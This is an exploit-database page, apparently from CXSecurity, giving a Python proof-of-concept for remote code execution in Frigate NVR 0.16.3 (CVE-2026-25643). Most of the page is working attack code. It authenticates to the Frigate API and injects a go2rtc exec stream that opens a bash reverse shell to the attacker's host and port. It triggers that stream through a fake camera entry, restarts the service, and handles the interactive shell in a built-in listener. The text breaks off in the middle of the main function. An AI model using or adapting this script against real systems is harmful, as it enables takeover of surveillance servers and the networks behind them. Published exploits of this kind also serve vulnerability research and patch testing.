---
title: Frigate NVR 0.16.3 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026050020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-23
fetch_date: 2026-05-24T06:00:42.910736
---

# Frigate NVR 0.16.3 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Frigate NVR 0.16.3 Remote Code Execution** **2026.05.23**  Credit:  **[jduardo2704](https://cxsecurity.com/author/jduardo2704/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-25643](https://cxsecurity.com/cveshow/CVE-2026-25643/ "Click to see CVE-2026-25643")**  CWE: **N/A** | |

# Exploit Title: Frigate NVR 0.16.3 - Remote Code Execution
# Date: 2026-02-05
# Exploit Author: jduardo2704
# Vendor Homepage: https://frigate.video/
# Software Link: https://github.com/blakeblackshear/frigate
# Version: <= 0.16.3
# Tested on: Linux / Docker
# CVE: CVE-2026-25643
# Advisory: https://github.com/blakeblackshear/frigate/security/advisories/GHSA-4c97-5jmr-8f6x
import requests
import argparse
import sys
import json
import urllib3
import yaml
import time
import socket
import threading
import select
import re
# Silence SSL warnings
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
# Colors
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
RESET = '\033[0m'
# Event to synchronize the listener with the exploit thread
exploit\_ready = threading.Event()
def print\_status(msg, color=BLUE, symbol="[\*]"):
print(f"{color}{symbol} {msg}{RESET}")
def login\_frigate(session, url, username, password):
try:
print\_status(f"Authenticating as {username}...", BLUE)
res = session.post(f"{url}/api/login", json={"user": username, "password": password}, verify=False, timeout=10)
return res.status\_code == 200
except:
return False
def get\_config(session, url):
try:
res = session.get(f"{url}/api/config/raw", timeout=10)
content = res.text.strip()
if content.startswith('"'):
try:
config\_raw = json.loads(content)
except:
config\_raw = content
else:
config\_raw = content
return yaml.safe\_load(config\_raw)
except:
return None
def send\_payload(session, url, data):
final\_yaml = yaml.dump(data)
try:
session.post(
f"{url}/api/config/save?save\_option=restart",
data=final\_yaml,
headers={"Content-Type": "text/plain"},
timeout=5
)
except:
pass
def inject\_and\_exploit(url, username, password, lhost, lport):
"""Function to run in background thread"""
session = requests.Session()
session.verify = False
# 1. AUTHENTICATION LOGIC
if username and password:
if not login\_frigate(session, url, username, password):
print\_status("Login failed with provided credentials.", RED, "[-]")
sys.exit(1)
print\_status("Logged in successfully.", BLUE)
else:
print\_status("No credentials provided. Trying unauthenticated access...", YELLOW)
# 2. CONFIG RETRIEVAL & VALIDATION
print\_status("Fetching configuration...", BLUE)
config = get\_config(session, url)
if not config or not isinstance(config, dict):
print\_status("Failed to retrieve a valid configuration dictionary.", RED, "[-]")
print\_status("Target might be authenticated or API is restricted.", RED, "[-]")
sys.exit(1)
# 3. PAYLOAD PREPARATION
try:
payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
# Inject go2rtc
if 'go2rtc' not in config or config['go2rtc'] is None: config['go2rtc'] = {}
if 'streams' not in config['go2rtc'] or config['go2rtc']['streams'] is None: config['go2rtc']['streams'] = {}
config['go2rtc']['streams']['cve\_poc'] = [f"exec:{payload}"]
# Inject camera trigger
if 'cameras' not in config or config['cameras'] is None: config['cameras'] = {}
config['cameras']['cve\_trigger'] = {
'ffmpeg': {'inputs': [{'path': 'rtsp://127.0.0.1:8554/cve\_poc', 'roles': ['detect']}]},
'detect': {'enabled': False},
'audio': {'enabled': False},
'enabled': True
}
print\_status("Payload injected into config structure.", GREEN, "[+]")
# 4. SIGNAL LISTENER TO START
exploit\_ready.set()
time.sleep(5)
print\_status("Sending malicious config & triggering restart...", YELLOW)
send\_payload(session, url, config)
except Exception as e:
print\_status(f"Error during payload injection: {e}", RED, "[-]")
sys.exit(1)
def shell\_handler(lport):
"""Handles the incoming reverse shell connection"""
print\_status("Waiting for validation...", BLUE)
if not exploit\_ready.wait(timeout=20):
print\_status("Timeout waiting for exploit thread validation.", RED, "[-]")
return
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
try:
s.bind(('0.0.0.0', int(lport)))
s.listen(1)
print\_status(f"Validation OK. Listening on 0.0.0.0:{lport}...", GREEN, "[+]")
s.settimeout(60)
try:
conn, addr = s.accept()
print\_status(f"Connection received from {addr[0]}!", GREEN, "[+]")
print(f"{YELLOW}--- SHELL ESTABLISHED ---\n{RESET}")
s.settimeout(None)
conn.settimeout(None)
while True:
r, \_, \_ = select.select([sys.stdin, conn], [], [])
if conn in r:
data = conn.recv(4096)
if not data: break
# CLEAN OUTPUT LOGIC
output = data.decode(errors='ignore')
# Remove annoying bash TTY errors using Regex
# Matches "bash: cannot set terminal process group (PID): Inappropriate ioctl..."
output = re.sub(r"bash: cannot set terminal process group \(\d+\): Inappropriate ioctl for device\r?\n?", "", output)
# Matches "bash: no job control in this shell"
output = output.replace("bash: no job control in this shell\r\n", "")
output = output.replace("bash: no job control in this shell\n", "")
sys.stdout.write(output)
sys.stdout.flush()
if sys.stdin in r:
cmd = sys.stdin.readline()
conn.send(cmd.encode())
except socket.timeout:
print\_status("Exploit sent but no connection received (Timeout > 60s).", RED, "[-]")
except KeyboardInterrupt:
print\_status("\nClosing connection.", RED)
except Exception as e:
print\_status(f"Listener error: {e}", RED)
finally:
s.close()
def main():
parser = argparse.ArgumentParser(description="Frigate <= 0.16.3 RCE (Auto-Shell) - CVE-2026-25643")
parser.add\_argument('-u', '--url', required=True, help="Target URL")
parser.add\_argument('-U', '--username', required=False, help="Username (optional)")
parser.add\_argument('-P', '--password', required=False, help="Password (optional)")
parser.add\_argument('-lh', '--lhost', required=True, help="Your IP (LHOST)")
parser.add\_argument('-lp', '--lport', required=True, help="Your Port (LPORT)")
args = parser.parse\_args()
exploit\_thread = ...